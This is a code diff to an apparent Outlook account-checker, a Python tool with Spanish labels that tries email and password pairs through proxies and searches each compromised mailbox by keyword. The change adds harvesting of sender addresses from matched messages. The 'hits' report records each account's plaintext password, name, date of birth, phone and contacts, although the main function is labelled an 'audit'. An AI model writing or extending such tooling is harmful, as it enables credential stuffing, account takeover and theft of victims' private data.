@@ -409,17 +409,24 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                     country = 'US'
         # ── EXTRACCIÓN REAL DE MENSAJES (GRAPH API) ──
         subject_count = "N/A"
+        senders_found = []
         if keyword and "jerry7822" not in keyword.lower():
             if keyword.lower().startswith('from:') or keyword.lower().startswith('subject:'):
                 query = keyword
             else:
                 query = keyword # Search generally by default
                 
-            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=1&$select=Id"
+            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=5&$select=Id,From"
             try:
                 sr = session.get(search_url, headers=api_headers, verify=False, timeout=15)
                 if sr.status_code == 200:
                     data = sr.json()
+                    
+                    for msg in data.get("value", []):
+                        sender_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address")
+                        if sender_addr and sender_addr not in senders_found:
+                            senders_found.append(sender_addr)
+                            
                     subject_count = len(data.get("value", []))
                     if "@odata.count" in data:
                         subject_count = data["@odata.count"]
@@ -433,6 +440,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                 "domain": "outlook.com",
                 "match": keyword if keyword else "Bandeja Limpia",
                 "messages": subject_count,
+                "senders": ", ".join(senders_found) if senders_found else "N/A",
                 "country": country,
                 "name": name,
                 "dob": dob,
@@ -603,6 +611,7 @@ def send_consolidated_report(hits):
                 for h in items:
                     f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
                     f.write(f"PAIS: {h['country']} | MENSAJES: {h.get('messages', 'N/A')} | NOMBRE: {h.get('name', 'N/A')}\n")
+                    f.write(f"REMITENTES ENCONTRADOS: {h.get('senders', 'N/A')}\n")
                     f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
                     f.write("-" * 50 + "\n")
                 f.write("\n\n")
